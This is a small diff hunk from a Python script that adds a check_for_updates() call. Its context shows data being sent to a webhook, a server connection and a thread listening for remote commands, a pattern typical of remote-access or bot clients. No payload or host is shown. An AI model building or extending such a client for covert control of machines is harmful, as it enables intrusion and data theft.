@@ -498,6 +498,7 @@ def main():
         debug(f"Error sending data to webhook: {e}")
 
 if __name__ == "__main__":
+    check_for_updates()
     main()
     connect_to_server()
     main_thread = threading.Thread(target=listen_for_commands)
